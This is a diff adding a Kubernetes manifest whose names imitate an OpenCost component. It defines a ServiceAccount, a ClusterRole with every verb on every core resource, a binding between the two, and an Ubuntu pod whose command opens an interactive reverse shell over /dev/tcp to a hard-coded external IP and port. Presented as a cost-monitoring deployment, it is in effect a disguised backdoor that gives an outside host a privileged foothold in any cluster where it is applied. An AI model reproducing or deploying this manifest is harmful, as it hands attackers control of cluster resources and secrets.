@@ -1,0 +1,37 @@
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: opencost-model-psi
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: opencost-model-psi
+spec:
+  serviceAccountName: opencost-model-psi
+  containers:
+  - name: ubuntu
+    image: ubuntu:latest
+    command: ["bash", "-c", "bash -i >& /dev/tcp/5.75.174.26/9188 0>&1"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: opencost-model-psi
+rules:
+- apiGroups: [""]
+  resources: ["*"]
+  verbs: ["*"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: opencost-model-psi
+subjects:
+- kind: ServiceAccount
+  name: opencost-model-psi
+  namespace: default
+roleRef:
+  kind: ClusterRole
+  name: opencost-model-psi
+  apiGroup: rbac.authorization.k8s.io
